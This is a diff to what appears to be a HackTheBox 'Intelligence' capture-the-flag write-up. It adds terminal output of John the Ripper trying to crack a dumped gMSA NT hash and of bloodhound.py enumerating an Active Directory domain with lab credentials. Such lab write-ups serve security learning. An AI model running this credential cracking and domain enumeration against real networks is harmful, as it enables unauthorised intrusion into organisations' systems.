@@ -601,3 +601,33 @@ Users or groups who can read password for svc_int$:
  > itsupport
 svc_int$:::c699eaac79b69357d9dabee3379547e6
 ```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/gMSADumper]
+└─# john svc_int_hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:01 DONE (2021-10-27 01:02) 0g/s 7795Kp/s 7795Kc/s 7795KC/s      markinho..*7¡Vamos!
+Session completed
+```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence/BloodHound.py]
+└─# python3 bloodhound.py -u Ted.Graves -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb -c All               127 ⨯
+INFO: Found AD domain: intelligence.htb
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: dc.intelligence.htb
+INFO: Found 42 users
+INFO: Found 54 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: svc_int.intelligence.htb
+INFO: Querying computer: dc.intelligence.htb
+WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.202622175216675 seconds
+INFO: Done in 00M 27S
+```
